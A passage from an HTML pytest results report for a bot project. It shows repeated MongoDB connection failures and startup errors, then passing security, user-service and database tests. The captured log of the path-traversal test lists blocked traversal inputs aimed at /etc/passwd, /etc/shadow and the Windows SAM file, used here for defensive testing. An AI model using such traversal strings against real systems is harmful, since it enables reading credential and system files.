WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf379488ed7674ef4ee97d, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf379a88ed7674ef4ee97e, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37a188ed7674ef4ee97f, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37aa88ed7674ef4ee980, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37b788ed7674ef4ee981, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.utils.errors:errors.py:125 Error occurred: Polling is not started
ERROR    src.core.application:application.py:184 Error during bot shutdown: An unexpected error occurred. Please try again or contact support.
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37bd88ed7674ef4ee982, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37c388ed7674ef4ee983, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37ca88ed7674ef4ee984, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37d388ed7674ef4ee985, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37e088ed7674ef4ee986, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.utils.errors:errors.py:125 Error occurred: Polling is not started
ERROR    src.core.application:application.py:184 Error during bot shutdown: An unexpected error occurred. Please try again or contact support.
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 1 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37e588ed7674ef4ee987, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 2 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37eb88ed7674ef4ee988, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 3 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37f288ed7674ef4ee989, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 4 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf37fb88ed7674ef4ee98a, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
WARNING  src.database.manager:manager.py:126 MongoDB connection attempt 5 failed: localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms), Timeout: 5.0s, Topology Description: &lt;TopologyDescription id: 68cf380888ed7674ef4ee98b, topology_type: Unknown, servers: [&lt;ServerDescription (&#x27;localhost&#x27;, 27017) server_type: Unknown, rtt: None, error=AutoReconnect(&#x27;localhost:27017: [Errno 111] Connection refused (configured timeouts: socketTimeoutMS: 5000.0ms, connectTimeoutMS: 5000.0ms)&#x27;)&gt;]&gt;
ERROR    src.database.manager:manager.py:138 Max retries exceeded for MongoDB connection
WARNING  src.database.manager:manager.py:63 Failed to connect to MongoDB, continuing without it
ERROR    src.utils.errors:errors.py:125 Error occurred: type object &#x27;ModuleHealthStatus&#x27; has no attribute &#x27;UNKNOWN&#x27;
ERROR    src.core.application:application.py:537 Error registering core services: An unexpected error occurred. Please try again or contact support.
ERROR    src.core.application:application.py:771 Failed to initialize emotional intelligence: unterminated string literal (detected at line 1) (personalization_service.py, line 1)
WARNING  src.core.application:application.py:107 Emotional intelligence system failed to initialize
ERROR    src.utils.errors:errors.py:125 Error occurred: Polling is not started
ERROR    src.core.application:application.py:184 Error during bot shutdown: An unexpected error occurred. Please try again or contact support.<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/performance/emotional/test_performance_benchmarks.py::test_concurrent_user_load</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_bot_token_not_exposed_in_logs</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_webhook_url_validation</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_webhook_request_validation</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.handlers.webhook:webhook.py:105 Invalid request method: &lt;Mock name=&#x27;mock.method&#x27; id=&#x27;137537002668784&#x27;&gt;<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_secure_headers_present</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_auth_security.py::TestAuthSecurity::test_environment_variable_exposure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_sensitive_data_not_logged</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_data_encryption_at_rest</td>
          <td class="col-duration">0.10</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_json_serialization_safety</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_memory_cleanup_after_processing</td>
          <td class="col-duration">0.32</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-242&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-243&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-244&#x27; coro=&lt;TestBotApplicationIntegration.test_graceful_shutdown_integration.&lt;locals&gt;.long_running_task() running at /home/azureuser/repos/yabot/tests/integration/test_app_integration.py:223&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-332&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-333&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-335&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-336&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-438&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-439&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-441&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-442&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-444&#x27; coro=&lt;EventBus._flush_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:450&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;
ERROR    asyncio:base_events.py:1821 Task was destroyed but it is pending!
task: &lt;Task pending name=&#x27;Task-445&#x27; coro=&lt;EventBus._retry_loop() running at /home/azureuser/repos/yabot/src/events/bus.py:463&gt; wait_for=&lt;Future pending cb=[Task.task_wakeup()]&gt;&gt;<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_sql_injection_prevention</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_file_path_traversal_prevention</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.utils.file_handler:file_handler.py:31 Path traversal attempt blocked: ../../../etc/passwd
WARNING  src.utils.file_handler:file_handler.py:31 Path traversal attempt blocked: ..\..\..\windows\system32\config\sam
WARNING  src.utils.file_handler:file_handler.py:31 Path traversal attempt blocked: /etc/shadow
WARNING  src.utils.file_handler:file_handler.py:31 Path traversal attempt blocked: ../../../../etc/hosts
WARNING  src.utils.file_handler:file_handler.py:31 Path traversal attempt blocked: ..\..\system.ini<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_data_size_limits</td>
          <td class="col-duration">0.01</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_data_security.py::TestDataSecurity::test_user_data_isolation</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_dependency_security_scan</td>
          <td class="col-duration">6.29</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_static_code_analysis_bandit</td>
          <td class="col-duration">0.18</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_environment_variable_security</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/security/test_vulnerability_scanning.py::TestVulnerabilityScanning::test_tls_ssl_configuration</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_create_user_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_create_user_sqlite_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.services.user:user.py:171 Error creating user profile in SQLite: SQLite error
ERROR    src.services.user:user.py:107 Error creating user: Failed to create user profile in SQLite
WARNING  src.services.user:user.py:235 Failed to rollback user profile in SQLite: SQLite error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_create_user_mongo_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.services.user:user.py:216 Error creating user state in MongoDB: MongoDB error
ERROR    src.services.user:user.py:107 Error creating user: Failed to create user state in MongoDB<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_get_user_context_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_get_user_context_not_found</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_update_user_state_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_update_user_state_no_changes</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.services.user:user.py:382 No changes made to user state for user: test_user_123<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_update_user_profile_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::TestUserService::test_delete_user_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.services.user:user.py:312 Error retrieving user profile from SQLite: &#x27;Mock&#x27; object is not iterable
ERROR    src.services.user:user.py:472 Failed to delete user state from MongoDB for user: test_user_123
WARNING  src.services.user:user.py:557 Would restore user profile for user: test_user_123 (not implemented)<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/services/test_user.py::test_create_user_service</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_init</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_databases_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_databases_mongo_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.init:init.py:44 Failed to initialize MongoDB<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_databases_sqlite_failure</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.init:init.py:50 Failed to initialize SQLite<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_initialize_databases_exception</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>ERROR    src.database.init:init.py:57 Error during database initialization: Test error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_detect_migrations</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_detect_migrations_with_existing_data</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_check_sqlite_migration_status_success</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_check_sqlite_migration_status_no_data</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="empty log">No log output captured.</div></td></tr></tbody>
      <tbody class="passed results-table-row">
        <tr>
          <td class="col-result">Passed</td>
          <td class="col-name">tests/unit/test_database_init.py::TestDatabaseInitializer::test_check_sqlite_migration_status_exception</td>
          <td class="col-duration">0.00</td>
          <td class="col-links"></td></tr>
        <tr>
          <td class="extra" colspan="4">
            <div class="log"> -------------------------------Captured log call-------------------------------- <br/>WARNING  src.database.init:init.py:135 Error checking SQLite migration status: Test error<br/></div></td></tr></tbody>
      <tbody class="passed results-table-row">
